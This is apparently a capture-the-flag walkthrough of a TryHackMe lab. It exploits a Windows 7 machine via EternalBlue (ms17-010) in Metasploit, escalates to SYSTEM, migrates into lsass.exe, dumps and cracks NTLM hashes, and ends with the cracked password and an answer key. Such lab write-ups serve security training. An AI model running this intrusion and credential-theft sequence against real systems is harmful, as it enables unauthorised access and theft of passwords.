Hi!

Let's start!

1. To begin with, we must classically connect to a VPN using OpenVPN.
Go to your [profile](https://tryhackme.com/access), download the file to connect, go to "/Downloads" and create the new
terminal:

```$ openvpn <Name>.ovpn ```

2. After that, we open the quest no. 1 and launch the instance (Deploy).

3. After all this, we can slowly start. The first thing we do is scan the machine:

``` $ nmap -Pn <ip> ```

Scanning shows us the services and ports on which they operate. Let's try to find out about distribution.

```$ nmap -A -T 5 <ip> -vv```

We can see that the machine is Windows 7.

4. Now we need to find out what the machine is vulnerable to (ms ?? - ???). So we type:

```$ nmap --script vuln <ip> -vv```

And we see smb-vuln-ms17-010 ( [ms17-010](https://www.exploit-db.com/exploits/42315) ).

5. Now let's try to access the machine.

6. Run [metasploit](https://www.metasploit.com/):

```$ msfconsole```

Search exploit to this susceptibility in msf:

```$ search ms17–010```

Now you see list available attacks. We due to the fact that we know the distribution, we choose this on Windows 7.

``` $ use 2 ``` (windows/smb/ms17_010_eternalblue)

7. Now we must find out what to options we must refill to attack:

```$ show options```

We see RHOST, so we complete it:

```$ set RHOSTS <ip>```

And run script:

```$ run```

We should access the console!

If necessary, make sure the exploit is working properly. Click enter and you should see a DOS shell.
Try to enter the shell background (CTRL + Z). If it fails, you may need to reboot the machine (deploy), but before that try running the script again and see if it works.

Push enter.

8. If you haven't entered the shell background (CTRL + Z). Find out on the internet how
convert shell to meterpreter in metasploit. What is the name of the post module we will use.
(Exact path, similar to the name of the exploit used).

9. Let's go back to the metasploit first:

```$ background```

Let's verify that the session still exists:

```$ session```

We should see information about the session, its type, etc.

10. Let's try to change shell to meterpreter:

```$ use multi/manage/shell_to_meterpreter```

Fill in all missing options to capture shell:

```
$ set LPORT 1234
$ set SESSION 1
```

Run:

```$ run```

If that doesn't work try create shell again.

11. Let's see the existing sessions:

```$ session```

We should see the second session, which is of type meterpreter.

Let's try to connect to it:

```$ sessions 2```

We should be able to see the meterpreter console.

12. Let's check if we escalated to NT AUTHORITY \ SYSTEM. Run this command to do this:

```$ getsystem```

We can freely change the shells from shell to meterpreter.

Let's check who we are:

```
$ shell
$ whoami
```

Now we back to meterpreter ( CTRL + Z ).

13. Just because we are a system does not mean that our process is also. Let's check the list of running processes:

```$ ps```

And remember the process id (PID).

14. Let's migrate the lsass.exe process. Having a meterpreter let's enter:

```$ migrate 708```

15. Let's dump non-primary user passwords for cracking later.

In our elevated shell (meterpreter) run the command:

```$ hashdump```

This will dump all password hashes on the computer if we have the appropriate permissions to do so.

Which user is not the default?

16. Copy the hashes to the file to crack. (these [NTLM](https://en.wikipedia.org/wiki/NT_LAN_Manager) hashes, paste them as you see in the console).

Let's organize the hash to crack. (user: hash <- the last "cluster of letters" in the line after : and before :::)

e.g.
```Administrator:31d6cfe0d16(...)```

17. I will use the hashcat to crack the hash:

``` $ hashcat -a 0 -m 1000 <HashFile>.txt <WordlistToCrack e.g. rockyou.txt>.txt --force --username --show ```

After a while we should get the password to Jon (alqfna22)

18. Now let's look for the flags:

1) The first one is in C:\flag1.txt

2) Next in C:\Documents and Settings\Jon\Documents\flag3.txt

3) And the last one in C:\Windows\System32\config\flag2.txt

Each flag can be shown with a command: ```type```
e.g. ``` type flag1.txt ```

19. Congratulations you have completed all the tasks. Good luck!

// Completing the headings

Task 1.

2) 3

3) ms17-010

Task 2. 

2) exploit/windows/smb/ms17_010_eternalblue

3) RHOSTS

Task 3.

1) post/multi/manage/shell_to_meterpreter

2) SESSION

Task 4.

1) Jon

2) alqfna22

Task 5.

1) Write flag number 1

2) Write flag number 2

3) Write flag number 3 
